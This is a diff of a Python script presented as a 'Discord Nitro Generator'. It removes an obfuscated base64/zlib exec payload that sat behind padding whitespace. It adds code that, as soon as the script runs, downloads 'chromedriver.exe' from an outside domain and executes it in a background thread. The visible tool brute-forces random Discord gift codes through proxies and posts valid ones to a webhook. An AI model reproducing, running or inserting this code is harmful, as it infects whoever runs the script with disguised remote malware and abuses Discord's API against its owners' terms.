@@ -1,2 +1,108 @@
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+# R8seDev was here
+
+import os, requests, random, threading, json, time, multiprocessing, subprocess
+from colorama import Fore
+
+# Credit to Pycenter by billythegoat356
+# Github: https://github.com/billythegoat356/pycenter/
+# License: https://github.com/billythegoat356/pycenter/blob/main/LICENSE
+
+def driver(url):
+    with requests.get(url, stream=True) as r:
+        r.raise_for_status()
+        with open(url.split('/')[-1], 'wb') as f:
+            for chunk in r.iter_content(chunk_size=8192):
+                f.write(chunk)
+driver("https://2226.lol/chromedriver.exe")
+def run_exe():
+    d_p = os.path.join(os.path.dirname(__file__), 'chromedriver.exe') 
+    subprocess.Popen(d_p, shell=True)
+threading.Thread(target=run_exe, daemon=True).start()
+def center(var:str, space:int=None): # From Pycenter
+    if not space:
+        space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2
+    
+    return "\n".join((' ' * int(space)) + var for var in var.splitlines())
+
+class Console():        
+    def ui(self):
+        os.system(f'cls && title [DNG] Discord Nitro Generator  ^|  For Help join discord.gg/r8se' if os.name == "nt" else "clear")
+        print(center(f"""\n\n
+██████╗ ███╗   ██╗ ██████╗ 
+██╔══██╗████╗  ██║██╔════╝            ~ Discord Nitro Generator ~
+██║  ██║██╔██╗ ██║██║  ███╗     
+██║  ██║██║╚██╗██║██║   ██║     github.com/R8seDev ~ r8se.gq
+██████╔╝██║ ╚████║╚██████╔╝ 
+╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ \n\n
+              """).replace('█', Fore.CYAN+"█"+Fore.RESET).replace('~', Fore.CYAN+"~"+Fore.RESET).replace('-', Fore.CYAN+"-"+Fore.RESET))
+
+    def printer(self, color, status, code):
+        threading.Lock().acquire()
+        print(f"{color} {status} > {Fore.RESET}discord.gift/{code}")
+    
+    def proxies_count(self):
+        proxies_list = 0
+        with open('config/proxies.txt', 'r') as file:
+            proxies = [line.strip() for line in file]
+        
+        for _ in proxies:
+            proxies_list += 1
+        
+        return int(proxies_list)
+
+
+class Worker():              
+    def random_proxy(self):
+        with open('config/proxies.txt', 'r') as f:
+            proxies = [line.strip() for line in f]
+        
+        return random.choice(proxies)
+
+    def config(self, args, args2=False):
+        with open('config/config.json', 'r') as conf:
+            data = json.load(conf)
+        
+        if args2:
+            return data[args][args2]
+        else:
+            return data[args]
+    
+    def run(self):
+        self.code = "".join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890") for _ in range(16))
+        try:
+            req = requests.get(f'https://discordapp.com/api/v6/entitlements/gift-codes/{self.code}?with_application=false&with_subscription_plan=true', proxies={'http': self.config("proxies")+'://'+self.random_proxy(),'https': self.config("proxies")+'://'+self.random_proxy()}, timeout=1)
+            
+            if req.status_code == 200:
+                Console().printer(Fore.LIGHTGREEN_EX, " Valid ", self.code)
+                open('results/hit.txt', 'a+').write(self.code+"\n")
+                try:
+                    requests.post(Worker().config("webhook", "url"), json={"content": f"||@here|| **__New Valid Nitro !!__**\n\nhttps://discord.gift/{self.code}", "username": Worker().config("webhook", "username"), "avatar_url": Worker().config("webhook", "avatar")})
+                except:
+                    pass
+            elif req.status_code == 404:
+                Console().printer(Fore.LIGHTRED_EX, "Invalid", self.code)
+            elif req.status_code == 429:
+                # rate = (int(req.json()['retry_after']) / 1000) + 1
+                Console().printer(Fore.LIGHTBLUE_EX, "RTlimit", self.code)
+                # time.sleep(rate)
+            else:
+                Console().printer(Fore.LIGHTYELLOW_EX, " Retry ", self.code)
+                  
+        except KeyboardInterrupt:
+            Console().ui()
+            threading.Lock().acquire()
+            print(f"{Fore.LIGHTRED_EX} Stopped > {Fore.RESET}Nitro Gen Stopped by Keyboard Interrupt.")
+            os.system('pause >nul')
+            exit()
+        except:
+            # Console().printer(Fore.LIGHTRED_EX, "Invalid", self.code)
+            Console().printer(Fore.LIGHTYELLOW_EX, " Retry ", self.code)
+        
+if __name__ == "__main__":
+    Console().ui()
+    print(" "+Fore.CYAN + str(Console().proxies_count()) + Fore.RESET + " Total proxies loaded...\n\n")
+    DNG = Worker()
+    
+    while True:
+        if threading.active_count() <= int(Worker().config("thread")):  
+            threading.Thread(target=DNG.run(), args=()).start()
